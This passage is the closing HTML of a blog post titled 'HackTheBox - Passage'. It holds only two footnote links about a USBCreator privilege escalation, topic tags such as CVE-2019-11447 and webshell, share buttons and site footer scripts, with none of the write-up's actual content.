</span></span></code></pre></div><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/>https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149>https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/cve-2019-11447/>CVE-2019-11447</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/ssh-key-reuse/>SSH-key-reuse</a></li><li><a href=https://fahmifj.github.io/tags/password-cracking/>Password-cracking</a></li><li><a href=https://fahmifj.github.io/tags/usbcreator/>USBCreator</a></li><li><a href=https://fahmifj.github.io/tags/gdbus/>gdbus</a></li><li><a href=https://fahmifj.github.io/tags/arbitrary-file-write/>Arbitrary-file-write</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Passage&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f&hashtags=Linux%2cCVE-2019-11447%2cWebshell%2cSSH-key-reuse%2cPassword-cracking%2cUSBCreator%2cgdbus%2cArbitrary-file-write"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f&title=HackTheBox%20-%20Passage&summary=HackTheBox%20-%20Passage&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f&title=HackTheBox%20-%20Passage"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Passage%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Passage on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Passage&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpassage%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>